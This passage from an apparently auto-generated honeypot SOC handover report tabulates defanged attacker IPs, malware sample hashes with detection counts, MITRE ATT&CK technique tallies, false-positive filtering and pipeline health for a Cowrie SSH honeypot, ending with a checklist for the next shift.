| `115.190.126[.]68` | 1 | 2026-05-26 17:18 | 2026-05-26 17:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.1.87[.]115` | 1 | 2026-05-26 16:49 | 2026-05-26 16:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.203.25[.]201` | 1 | 2026-05-26 16:08 | 2026-05-26 16:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.147[.]81` | 1 | 2026-05-26 17:24 | 2026-05-26 17:24 | 6s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-05-26 15:55 | 2026-05-26 15:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-26 16:18 | 2026-05-26 16:19 | 55s | 0 | `T1592` | 🟢 LOW |
| `98.158.129[.]28` | 1 | 2026-05-26 17:32 | 2026-05-26 17:33 | 38s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `98.158.129[.]28` | CA | Colosseum Online Inc. | **100** ⚠️ | 1 |
| `118.196.56[.]74` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 16 |
| `120.1.87[.]115` | CN | China Unicom Heibei Province Network | **100** ⚠️ | 12 |
| `172.206.225[.]242` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `112.219.104[.]42` | KR | LG Uplus | **100** ⚠️ | 22 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `35.237.94[.]18` | US | Google LLC | **100** ⚠️ | 50 |
| `183.166.94[.]133` | CN | CHINANET Anhui province network | **100** ⚠️ | 37 |
| `190.81.117[.]162` | PE | America Movil Peru S.A.C. | **100** ⚠️ | 50 |
| `40.82.214[.]8` | AU | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 163 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 81 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 78 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 39 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 39 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 175 cases |
| Tool 34  | Credential Extractor        | ✅ 159 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (4.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 78 priority case(s) shown individually · 16 recon entry/entries in table (7 group(s) consolidating 81 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-26T18:31:05Z_
